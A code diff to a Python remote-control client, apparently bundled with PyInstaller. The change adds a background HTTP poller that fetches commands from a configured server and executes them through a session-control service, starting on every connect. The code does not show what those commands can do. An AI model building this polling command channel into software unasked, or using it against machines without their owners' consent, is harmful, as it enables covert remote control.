@@ -7,16 +7,24 @@ import threading
 import time
 import uuid
 
-from client.config.config import SERVER_ADDR, RECONNECT_INTERVAL_SECONDS
+from client.commands.services.session_control_service import SessionControlService
+from client.config.config import (
+    CONTROL_POLL_INTERVAL_SECONDS,
+    RECONNECT_INTERVAL_SECONDS,
+    SERVER_ADDR,
+    UPLOAD_BASE_URL,
+)
 from core.utils.client_util import check_privilege, get_system_paths
+from client.connection.http_control_poller import HttpControlPoller
 from client.connection.server_connection import ServerConnection
 from core.utils.logger import logger
 
 # 强制导入所有平台模块，让 PyInstaller 检测到
 import client.commands.platform.mac
-if os.name=='nt':
+if os.name == 'nt':
     import client.commands.platform.win
 import client.commands.platform.linux
+
 
 class Client:
     RECONNECT_INTERVAL = RECONNECT_INTERVAL_SECONDS
@@ -31,7 +39,11 @@ class Client:
         self._receiver_error = None
         self._receiver_error_lock = threading.Lock()
 
+        self._control_stop_event = threading.Event()
+        self._control_poller = None
+
         self._create_connection()
+        self._start_control_poller()
 
     def _create_connection(self):
         """
@@ -77,6 +89,31 @@ class Client:
         self._receiver_stop_event = threading.Event()
         self._clear_receiver_error()
         self._receiver_thread = None
+
+    # add HTTP 控制轮询线程 2026-04-10 00:00
+    def _handle_http_control_command(self, command: str):
+        logger.warning(f'Executing HTTP control command: {command}')
+        SessionControlService(self.server).execute_control_command(command)
+
+    # add HTTP 控制轮询线程 2026-04-10 00:00
+    def _start_control_poller(self):
+        if self._control_poller is not None:
+            return
+
+        self._control_poller = HttpControlPoller(
+            base_url=UPLOAD_BASE_URL,
+            client_id=self.client_id,
+            command_handler=self._handle_http_control_command,
+            poll_interval=CONTROL_POLL_INTERVAL_SECONDS,
+            stop_event=self._control_stop_event,
+        )
+        self._control_poller.start()
+
+    # add HTTP 控制轮询线程 2026-04-10 00:00
+    def _stop_control_poller(self):
+        self._control_stop_event.set()
+        if self._control_poller is not None:
+            self._control_poller.stop()
 
     def _reset_connection(self):
         """
@@ -168,6 +205,7 @@ class Client:
         """
         建立连接并完成握手
         """
+        self._start_control_poller()
         self._connect_socket()
         self._handshake()
         self._start_receiver_thread()
@@ -231,14 +269,8 @@ if __name__ == '__main__':
         client.connect()
         client.wait()
     except KeyboardInterrupt:
+        client._stop_control_poller()
         sys.exit(0)
     except Exception as e:
+        client._stop_control_poller()
         logger.error(e, exc_info=True)
-
-
-
-
-
-
-
-
